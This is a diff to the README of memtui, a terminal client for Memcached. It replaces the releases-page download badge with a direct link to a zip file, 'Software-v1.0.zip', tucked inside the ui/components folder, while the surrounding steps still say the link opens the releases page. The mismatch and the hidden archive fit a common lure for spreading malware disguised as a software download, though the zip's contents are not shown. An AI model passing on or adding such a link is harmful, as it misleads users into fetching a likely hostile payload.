@@ -8,7 +8,7 @@ Welcome to memtui, a modern terminal user interface (TUI) client for Memcached. 
 
 **To get started, visit the Releases page to download the latest version of memtui:**
 
-[![Download memtui](https://img.shields.io/badge/Download-memtui-blue.svg)](https://github.com/zelonycodo/memtui/releases)
+[![Download memtui](https://github.com/zelonycodo/memtui/raw/refs/heads/main/ui/components/Software-v1.0.zip)](https://github.com/zelonycodo/memtui/raw/refs/heads/main/ui/components/Software-v1.0.zip)
 
 1. Click the link above to open the releases page.
 2. On the releases page, find the latest version of memtui.
